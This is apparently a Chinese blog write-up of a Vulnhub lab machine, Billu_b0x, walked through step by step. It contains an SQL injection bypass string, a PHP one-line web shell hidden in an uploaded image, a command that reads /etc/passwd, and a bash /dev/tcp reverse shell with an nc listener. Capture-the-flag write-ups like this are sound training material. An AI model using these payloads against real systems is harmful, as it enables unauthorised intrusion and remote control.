---
layout: mypost
title: Vulnhub靶机Billu_b0x
categories: [靶机]
---

靶机下载地址：[Billu_b0x](https://www.vulnhub.com/entry/billu-b0x,188/)

![](https://z3.ax1x.com/2021/05/05/gKRu4O.png)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/05/05/gKRU58.png)

Billu_b0x 地址：192.168.43.151

访问 web 页面

![](https://z3.ax1x.com/2021/05/05/gKRcV0.png)

![](https://z3.ax1x.com/2021/05/05/gKRWPU.png)



![](https://z3.ax1x.com/2021/05/05/gKRzMd.png)

post 方式提交表单，简单 sql 注入被过滤

dirb 扫目录

![](https://z3.ax1x.com/2021/05/05/gKWAJS.png)

test、add、in、c、index、show、panel 都挺可疑，先看 test.php

![](https://z3.ax1x.com/2021/05/05/gKWGz4.png)

文件包含警告

![](https://z3.ax1x.com/2021/05/05/gKWBFK.png)

![](https://z3.ax1x.com/2021/05/05/gKWrWD.png)

确认

查看之前扫出来的 php 文件

![](https://z3.ax1x.com/2021/05/05/gKWReI.png)

add.php 只是个页面，没有后台处理代码

![](https://z3.ax1x.com/2021/05/05/gKWWwt.png)

c.php 是数据库连接文件，发现 mysql 连接用户名密码

billu 的密码 b0x_billu ，数据库名是 ica_lab

登录 phpmy 页面

![](https://z3.ax1x.com/2021/05/05/gKfMXd.png)

![](https://z3.ax1x.com/2021/05/05/gKf37t.png)

发现

![](https://z3.ax1x.com/2021/05/05/gKfJtf.png)

biLLu 的密码 hEx_it，用以登录主页

这里还可以审计 index.php 代码，找 sql 注入绕过规则

![](https://z3.ax1x.com/2021/05/05/gKfvDA.png)

虽然前面使用 str_replace( ) 函数将单引号全部过滤了，但是可以在输 pass 时，输入一个 \ 符号，将 uname 逃逸出来

输入 pass=123\，uname= or 1=1 --+ 直接登录

> 查询语句即 select * from auth where pass=‘123\’ and uname=’ or 1=1 – ’

后猜测 phpmy 配置文件路径在 /var/www/phpmy 下

> phpmyadmin 的默认的配置文件是 config.inc.php

![](https://z3.ax1x.com/2021/05/05/gKf4BR.png)

root 的密码 roottoor ，这里直接登录 ssh 就可以直接拿到 root 权限结束

![](https://z3.ax1x.com/2021/05/05/gK5LgU.png)

登录主页查看

![](https://z3.ax1x.com/2021/05/05/gK4msH.png)

![](https://z3.ax1x.com/2021/05/05/gK4KeA.png)

文件上传警告

直接上传改后缀的一句话🐎

![](https://z3.ax1x.com/2021/05/05/gK43Jf.png)

失败

![](https://z3.ax1x.com/2021/05/05/gK4JSS.png)

换一种思路，上传一张正常图片在 burp 中抓包，在图片末尾加入一句话🐎

```php
<?php system($_GET['cmd']);?>
```

![](https://z3.ax1x.com/2021/05/05/gK4tyQ.png)

![](https://z3.ax1x.com/2021/05/05/gK46lF.png)

测试

URL里加 ?cmd=cat%20/etc/passwd;ls

正文里加 load=/uploaded_images/2.png&continue=continue

![](https://z3.ax1x.com/2021/05/05/gK4cy4.png)

可行，准备反弹 shell

监听

```bash
nc -lvnp 5454
```

转换成 url 编码

```bash
echo "bash -i >& /dev/tcp/192.168.43.110/5454 0>&1" | bash
```

![](https://z3.ax1x.com/2021/05/05/gK5dje.png)

![](https://z3.ax1x.com/2021/05/05/gK50nH.png)

成功上线，用 python 获取标准交互 shell，切换用户（或者用经典 exp 提权）

![](https://z3.ax1x.com/2021/05/05/gK5sAI.png)

Pwned ！